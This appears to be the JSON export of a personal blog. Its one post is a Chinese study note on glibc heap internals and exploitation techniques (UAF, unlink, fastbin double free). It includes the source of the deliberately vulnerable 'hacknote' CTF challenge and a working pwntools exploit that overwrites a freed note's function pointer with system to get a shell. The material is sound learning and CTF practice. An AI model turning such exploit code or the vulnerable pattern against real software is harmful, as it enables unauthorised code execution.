{"meta":{"title":"Scardow's blog","subtitle":"","description":"","author":"Scarce Shadow","url":"https://scardow.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-08-16T12:03:43.000Z","updated":"2021-08-16T12:03:43.143Z","comments":true,"path":"categories/index.html","permalink":"https://scardow.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-08-16T12:03:26.000Z","updated":"2021-08-16T12:03:26.942Z","comments":true,"path":"tags/index.html","permalink":"https://scardow.github.io/tags/index.html","excerpt":"","text":""},{"title":"PWN","date":"2021-08-17T00:12:24.000Z","updated":"2021-08-17T00:12:24.961Z","comments":true,"path":"categories/PWN/index.html","permalink":"https://scardow.github.io/categories/PWN/index.html","excerpt":"","text":""},{"title":"about","date":"2017-05-31T02:05:56.000Z","updated":"2021-08-18T11:32:33.796Z","comments":true,"path":"about/index.html","permalink":"https://scardow.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"Heap Exploitation（主要记录知识框架和利用技巧，更多细节不在此记录）","slug":"Heap Exploitation","date":"2021-08-16T23:54:01.000Z","updated":"2021-08-26T16:06:03.141Z","comments":true,"path":"2021/08/17/Heap Exploitation/","link":"","permalink":"https://scardow.github.io/2021/08/17/Heap%20Exploitation/","excerpt":"本文主要记录堆利用手法，并会随学习过程不断补充","text":"本文主要记录堆利用手法，并会随学习过程不断补充 Heap intro briefHeap memory allocator ptmalloc2 - glibc … (先记录glibc，复杂的堆管理器之后学) Mechanism of glibc malloc堆中数据结构 malloc分配最小空间（SIZE_T*4） chunk 结构 chunk头 + data Chunk 分类allocated chunk prev_size 若连续记忆体上一堆块为free chunk，prev_size为前一个堆块大小 若连续记忆体上一块为allocated chunk，则为上一块的data size由于size大小存在对齐，所以size后三比特始终为零，因此可以保存三个flag PREV_INUSE (bit 0): 上一块是否allocated IS_MMAPPED(bit 1): 该chunk是否由mmap分配 NON_MAIN_ARENA(bit 2): 是否不属于main arena free chunk ( bin ) prev_size size 同allocated chunk fd：指向链表的下一个chunk( 含bin头 ) bk: 指向链表的前一个chunk( 含bin头 ) fd_nextsize: 指向下一个large chunk( 不含bin头 ) bk_nextsize: 指向前一个large chunk( 不含bin头 ) top chunk 第一次malloc分配的heap为main arena，未分配的大堆块为top chunk last remainder malloc分配时unsorted bin切块后存入，unsorted bin仍存在 binchunk free后进入bin fast bin 单向链表, 相同大小在一条链上 LIFO 不会把下一块chunk P设置成0 size分为0x20，0x30，0x40 … 0x80 global_max_fast = 0x80 small bin 双向链环, 相同大小在一条链上 FIFO 会把下一块chunk P设置成0 size: 0x20, 0x30, 0x40 … 0x90 … 0x3f0 按照size大小分为62个bin, 分别为2~63 下标 SIZE_SZ=8（64 位） 2 0x20 3 0x30 4 0x40 5 0x50 X 0xX0 63(3F) 0x3f0 其中0x20 … 0x90为unsorted bin切割后分配的 large bin 双向链环(sorted) size &gt;= 1024(0x400) 组 数量 公差 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 不限制 unsorted bin 双向链环 free chunk大小大于0x80, glibc将chunk先放入unsorted bin malloc的执行过程 第一次malloc：当申请内存空间 &lt;128 KB 时， kernel分配132KB 的top chunk；&gt;128KB 时，使用mmap分配内存 第二次及之后： fastbin(LIFO) bins 按照索引从小到大查找 top chunk 向kernel索要空间 free 的执行过程与chunk的合并 free chunk先看上一块是否为free chunk(P位是否为0)，若是，则于前一堆块合并，在对前一个堆块unlink 再看下一堆块： top chunk: 与之合并（第二步使用的是合并之后的堆块） free：合并后一同加入unsorted bin inuse：加入unsorted bin 堆利用手法UAFfree(pointer) 后未将指针ptr清空, 该ptr称作dangling pointer，即为一个pointer指向一块释放的记忆体. 利用 infomation leak free 两个fastbin size的chunk，第二个chunk fd指向第一个chunk，若存在UAF，可将chunk user date输出leak addr malloc一块非fastbin，free是进入unsorted bin，fd 指向libc，ke输出或malloc回该堆块 struct type confusion double free 案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;struct note &#123; void (*printnote)(); char *content ;&#125;;struct note *notelist[5];int count = 0; void print_note_content(struct note *this)&#123; puts(this-&gt;content);&#125;void add_note()&#123; int i ; char buf[8]; int size ; if(count &gt; 5)&#123; puts(&quot;Full&quot;); return ; &#125; for(i = 0 ; i &lt; 5 ; i ++)&#123; if(!notelist[i])&#123; notelist[i] = (struct note*)malloc(sizeof(struct note)); if(!notelist[i])&#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; notelist[i]-&gt;printnote = print_note_content; printf(&quot;Note size :&quot;); read(0,buf,8); size = atoi(buf); notelist[i]-&gt;content = (char *)malloc(size); if(!notelist[i]-&gt;content)&#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0,notelist[i]-&gt;content,size); puts(&quot;Success !&quot;); count++; break; &#125; &#125;&#125;void del_note()&#123; char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(notelist[idx])&#123; free(notelist[idx]-&gt;content); free(notelist[idx]); puts(&quot;Success&quot;); &#125;&#125;void print_note()&#123; char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(notelist[idx])&#123; notelist[idx]-&gt;printnote(notelist[idx]); &#125;&#125;void magic()&#123; system(&quot;id&quot;);&#125;void menu()&#123; puts(&quot;----------------------&quot;); puts(&quot; HackNote &quot;); puts(&quot;----------------------&quot;); puts(&quot; 1. Add note &quot;); puts(&quot; 2. Delete note &quot;); puts(&quot; 3. Print note &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;----------------------&quot;); printf(&quot;Your choice :&quot;);&#125;;int main()&#123; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); char buf[4]; while(1)&#123; menu(); read(0,buf,4); switch(atoi(buf))&#123; case 1 : add_note(); break ; case 2 : del_note(); break ; case 3 : print_note(); break ; case 4 : exit(0); break ; default : puts(&quot;Invalid choice&quot;); break ; &#125; &#125; return 0;&#125; 漏洞点 free后未将指针清空造成UAF 利用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *host = &quot;training.pwnable.tw&quot;port = 11010# r = remote(host,port)r = process(&quot;./hacknote&quot;)gdb.attach(r)def addnote(size,content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))magic = 0x08048986# system@plt + 6system = 0x8048506addnote(32,&quot;ddaa&quot;)addnote(32,&quot;ddaa&quot;)addnote(32,&quot;ddaa&quot;)delnote(0)delnote(1)# note = system# context = &quot;;sh;&quot;addnote(8,p32(system) + b&quot;;sh;&quot;)printnote(0)r.interactive() Heap overflow利用using unlink透过overflow覆盖free chunk的fd、bk，再利用unlink unlink原理 根据上图，知shellcode被截断，因此可以使用jmp指令跳过 带有保护机制的unlinkFastbin attack利用Double free 只会检查fastbin link list是否等于将要free的chunk free(a); free(b); free(a) 此时，在malloc一个与 a 相同大小的chunk，则会取出 a，这时a 既为free，又为allocated，若在a中输入数据，就会更改a的fd指针，从而构造fake chunk，malloc出fake之后，造成任意地址任意写，或写入栈中控制程序流 malloc时会检测chunk size 在fake chunk地址 + 0x8 伪造size 在附近寻找目标size 利用技巧 参考资料： CTFwiki Angleboy的PPT","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"}]}],"categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"}]}